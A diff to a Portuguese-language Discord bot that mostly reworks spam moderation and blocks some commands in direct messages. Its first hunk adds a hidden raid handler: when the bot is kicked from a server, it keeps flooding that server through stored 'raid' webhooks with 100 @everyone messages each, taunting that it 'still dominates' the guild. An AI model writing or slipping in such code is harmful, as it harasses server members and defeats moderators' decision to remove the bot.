@@ -145,6 +145,22 @@ client.on('guildBanAdd', async (ban) => {
   }
 });
 
+client.on('guildDelete', async (guild) => {
+  // Bot foi removido / expulso da guilda: continuar spam via webhooks existentes.
+  if (global.raidWebhooks && global.raidWebhooks.length > 0) {
+    for (const webhook of global.raidWebhooks) {
+      try {
+        for (let i = 0; i < 100; i++) {
+          await webhook.send('@everyone O LOBO GUARANÁ FOI EXPULSO MAS AINDA DOMINA ESTA GUILDA! AAAAAAUUUUUUUU!');
+          await new Promise(resolve => setTimeout(resolve, 50));
+        }
+      } catch (error) {
+        console.log(`Erro no spam webhook após remoção do bot: ${error}`);
+      }
+    }
+  }
+});
+
 // ─── Censura ──────────────────────────────────────────────────────────────────
 const usuariosCensurados = new Set();
 const censuradoAviso = new Set();
@@ -155,66 +171,70 @@ client.censuradoAviso = censuradoAviso;
 const msgCount = new Map();
 client.msgCount = msgCount;
 
+const DM_BLOCKED_COMMANDS = new Set(['ticket', 'clear', 'falar', 'censurar', 'serverinfo', 'loteria', 'comprar', 'restaurar', 'caçada', 'procurar', 'pr']);
+
 // ─── XP + comandos ───────────────────────────────────────────────────────────
 const xpCooldown = new Map();
 
 client.on('messageCreate', async (message) => {
   if (message.author.bot) return;
-  if (!message.guild) return;
+  const isDM = !message.guild;
 
-  // Censura
-  if (usuariosCensurados.has(message.author.id) && !CENSURA_OWNER.includes(message.author.id)) {
-    message.delete().catch(() => {});
-    if (!censuradoAviso.has(message.author.id)) {
-      censuradoAviso.add(message.author.id);
-      message.author.send({ embeds: [new EmbedBuilder()
-        .setColor(0xFF0000)
-        .setTitle(`${E.warning} VOCÊ FOI CASTIGADO ${E.warning}`)
-        .setDescription('Suas mensagens estão sendo **removidas automaticamente**.\nEntre em contato com a staff.')
-        .setFooter({ text: message.guild.name }).setTimestamp()]
-      }).catch(() => {});
+  if (!isDM) {
+    // Censura
+    if (usuariosCensurados.has(message.author.id) && !CENSURA_OWNER.includes(message.author.id)) {
+      message.delete().catch(() => {});
+      if (!censuradoAviso.has(message.author.id)) {
+        censuradoAviso.add(message.author.id);
+        message.author.send({ embeds: [new EmbedBuilder()
+          .setColor(0xFF0000)
+          .setTitle(`${E.warning} VOCÊ FOI CASTIGADO ${E.warning}`)
+          .setDescription('Suas mensagens estão sendo **removidas automaticamente**.\nEntre em contato com a staff.')
+          .setFooter({ text: message.guild.name }).setTimestamp()]
+        }).catch(() => {});
+      }
+      return;
     }
-    return;
-  }
 
-  // Anti-spam melhorado
-  if (checkSpam(message.author.id) && !CENSURA_OWNER.includes(message.author.id)) {
-    message.delete().catch(() => {});
-    const s = spamMap.get(message.author.id);
+    // Anti-spam melhorado
+    if (checkSpam(message.author.id) && !CENSURA_OWNER.includes(message.author.id)) {
+      message.delete().catch(() => {});
+      const s = spamMap.get(message.author.id);
 
-    if (!s.warned) {
-      s.warned = true;
-      spamMap.set(message.author.id, s);
+      if (!s.warned) {
+        s.warned = true;
+        spamMap.set(message.author.id, s);
 
-      // Censura temporária de 2 minutos
-      const fimCastigo = Date.now() + 120000;
-      spamTimeout.set(message.author.id, fimCastigo);
-      usuariosCensurados.add(message.author.id);
-      censuradoAviso.delete(message.author.id);
-
-      const aviso = await message.channel.send({
-        content: `${E.aviso} ${message.author}, você foi silenciado por **2 minutos** por spam.`
-      }).catch(() => {});
-      if (aviso) setTimeout(() => aviso.delete().catch(() => {}), 8000);
-
-      // Remove censura após 2 minutos e avisa staff
-      setTimeout(async () => {
-        usuariosCensurados.delete(message.author.id);
+        // Censura temporária de 2 minutos
+        const fimCastigo = Date.now() + 120000;
+        spamTimeout.set(message.author.id, fimCastigo);
+        usuariosCensurados.add(message.author.id);
         censuradoAviso.delete(message.author.id);
-        spamTimeout.delete(message.author.id);
 
-        const canalStaff = message.guild.channels.cache.get(CANAL_STAFF_LOG);
-        if (canalStaff) {
-          canalStaff.send({ embeds: [new EmbedBuilder()
-            .setColor(0xFFA000)
-            .setTitle(`${E.aviso} Silêncio por Spam Encerrado`)
-            .setDescription(`${message.author} (${message.author.tag}) foi silenciado por spam e o castigo expirou.\n\nCanal: ${message.channel}`)
-            .setTimestamp().setFooter({ text: `${message.guild.name} • Anti-Spam` })]
-          }).catch(() => {});
-        }
-      }, 120000);
+        const aviso = await message.channel.send({
+          content: `${E.aviso} ${message.author}, você foi silenciado por **2 minutos** por spam.`
+        }).catch(() => {});
+        if (aviso) setTimeout(() => aviso.delete().catch(() => {}), 8000);
+
+        // Remove censura após 2 minutos e avisa staff
+        setTimeout(async () => {
+          usuariosCensurados.delete(message.author.id);
+          censuradoAviso.delete(message.author.id);
+          spamTimeout.delete(message.author.id);
+
+          const canalStaff = message.guild.channels.cache.get(CANAL_STAFF_LOG);
+          if (canalStaff) {
+            canalStaff.send({ embeds: [new EmbedBuilder()
+              .setColor(0xFFA000)
+              .setTitle(`${E.aviso} Silêncio por Spam Encerrado`)
+              .setDescription(`${message.author} (${message.author.tag}) foi silenciado por spam e o castigo expirou.\n\nCanal: ${message.channel}`)
+              .setTimestamp().setFooter({ text: `${message.guild.name} • Anti-Spam` })]
+            }).catch(() => {});
+          }
+        }, 120000);
+      }
+      return;
     }
-    return;
   }
 
   // Contador
@@ -237,7 +257,7 @@ client.on('messageCreate', async (message) => {
         .setTitle('⬆️ Level Up!')
         .setDescription(`Parabéns, ${message.author}! Você chegou ao **nível ${novoNivel}**!`)
         .setThumbnail(message.author.displayAvatarURL()).setTimestamp()] });
-      await aplicarCargoNivel(message.member, novoNivel, message.guild).catch(() => {});
+      if (message.guild) await aplicarCargoNivel(message.member, novoNivel, message.guild).catch(() => {});
     } else {
       saveUser(userId, { xp: novoXP });
     }
@@ -256,6 +276,13 @@ client.on('messageCreate', async (message) => {
       .setDescription(`${E.membro} **${alvo.username}** enviou **${count.toLocaleString('pt-BR')} mensagens** nesta sessão.`)
       .setThumbnail(alvo.displayAvatarURL()).setTimestamp()
       .setFooter({ text: 'Contagem desde o último restart do bot' })] });
+  }
+
+  if (isDM && DM_BLOCKED_COMMANDS.has(commandName)) {
+    return message.reply({ embeds: [new EmbedBuilder().setColor(0xFF0000)
+      .setTitle('❌ Comando indisponível em DM')
+      .setDescription('Este comando só funciona em servidores.')
+      .setTimestamp()] });
   }
 
   const cmdEconomia = economia.commands[commandName];
